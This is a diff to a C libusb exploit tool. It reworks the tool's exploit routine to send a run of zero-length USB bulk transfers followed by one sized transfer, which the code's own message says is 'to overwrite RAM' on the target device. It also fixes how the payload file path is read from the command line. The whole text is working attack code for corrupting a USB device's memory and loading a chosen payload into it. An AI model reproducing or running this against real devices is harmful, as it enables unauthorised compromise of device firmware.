@@ -49,16 +49,26 @@ static int exploit(dldata_t *payload) {
 		fprintf(stderr, "Error libusb_control_transfer: %s\n", libusb_error_name(rc));
 		return rc;
 	}
-wIndex += 0x10;//haaacckkkkeer
-	for (i = 0; i < wIndex; i++){
-		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, wValue, &transferred, 0);
+
+	for (i = 0; i < wIndex-1; i++){
+		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, 0, &transferred, 0);
 		if(rc) {
 			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
 			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
 			return rc;
 		}
-        dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+        dprint("libusb_bulk_transfer[%u]: transferred=%d\n", i, transferred);
 	}
+
+	printf("- exploit: sending last transfer to overwrite RAM...\n");
+	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, wValue, &transferred, 0);
+	if(rc) {
+		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
+		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
+		return rc;
+	}
+	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+	printf("- exploit: done.\n");
 
 	return rc;
 }
@@ -69,7 +79,6 @@ int main(int argc, char *argv[])
 	FILE *fd;
 	dldata_t *payload;
 	size_t payload_size, fd_size;
-	uint8_t mode;
 	int rc;
 
 	if (argc != 2) {
@@ -78,9 +87,9 @@ int main(int argc, char *argv[])
 		return EXIT_SUCCESS;
 	}
 
-	fd = fopen(argv[2],"rb");
+	fd = fopen(argv[1],"rb");
 	if (fd == NULL) {
-		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
+		fprintf(stderr, "Can't open input file %s !\n", argv[1]);
 		return EXIT_FAILURE;
 	}
 
